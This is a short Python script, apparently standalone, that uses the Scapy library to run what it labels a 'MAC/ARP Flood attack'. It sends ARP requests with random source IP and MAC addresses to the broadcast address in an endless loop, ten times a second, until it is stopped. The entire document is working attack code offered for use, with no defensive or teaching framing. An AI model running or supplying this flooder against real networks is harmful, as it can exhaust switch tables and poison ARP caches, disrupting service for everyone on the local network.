from scapy.all import ARP, send, RandMAC, RandIP
from time import sleep

def flood():
    PACKET = ARP(op=1, pdst="255.255.255.255", psrc=RandIP(), hwsrc=RandMAC())
    send(PACKET, verbose=False)

print("[*] Starting MAC/ARP Flood attack... Press Ctrl+C to stop.")

try:
    while True:
        flood()
        sleep(0.1) # You can change, if you want
except KeyboardInterrupt:
    print("\n[!] Flood stopped.")
